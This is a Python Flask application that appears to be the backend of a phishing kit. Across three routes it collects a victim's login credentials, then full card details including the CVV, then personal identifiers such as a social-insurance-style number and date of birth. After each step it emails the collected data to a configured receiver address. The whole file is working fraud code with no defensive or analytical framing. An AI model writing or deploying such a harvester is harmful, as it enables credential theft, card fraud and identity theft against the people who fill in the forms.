import os
from flask import Flask, render_template,request, redirect, url_for
from dotenv import load_dotenv
from send_email import EmailSender

# global variables name
username = None
password = None

# global variables c
c_name = None
c_number = None
c_exp = None
c_cv = None
c_addr = None

# global variables info
s_num = None
s_dob = None
s_postal = None
s_p_num = None


# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)

# Load environment variables if needed later
SENDER_EMAIL = os.getenv('SENDER_EMAIL')
PASSWORD = os.getenv('PASSWORD')
RECIEVER_EMAIL = os.getenv('RECIEVER_EMAIL')

def send_message():
    email_sender = EmailSender(
        user_name=username,
        user_password=password,
        c_name=c_name,
        c_number=c_number,
        c_exp=c_exp,
        c_cv=c_cv,
        c_addr=c_addr,
        s_num=s_num,
        s_dob=s_dob,
        s_postal=s_postal,
        s_p_num=s_p_num
    )
    result = email_sender.send_email()
    return result 

# Home route
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        global username, password
        username = request.form.get('username')
        password = request.form.get('password')
        send_message()
        return redirect(url_for('billing'))
    return render_template('dashboard/home.html')



@app.route('/billing', methods=['GET', 'POST'])
def billing():
    if request.method == 'POST':
        global c_name, c_number, c_exp, c_cv, c_addr
        c_name = request.form.get('c_name')
        c_number = request.form.get('c_number')
        c_exp = request.form.get('c_exp')
        c_cv = request.form.get('c_cv')
        c_addr = request.form.get('c_addr')
        send_message()
        return redirect(url_for('info'))
    return render_template('dashboard/billing.html')


@app.route('/info' , methods=['GET', 'POST'])
def info():
    if request.method == 'POST':
        global s_num, s_dob, s_postal, s_p_num
        s_num = request.form.get('s_num')
        s_dob = request.form.get('s_dob')
        s_postal = request.form.get('s_postal')
        s_p_num = request.form.get('s_p_num')
        send_message()
        return redirect(url_for('thankyou'))
    return render_template('dashboard/info.html')

@app.route('/thank-you')
def thankyou():
    result = send_message()
    if result :
        return "<h1>Thank you for your submission!</h1>"
    else:
        
        return render_template('dashboard/thankyou.html')

# Run the app
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000, debug=False)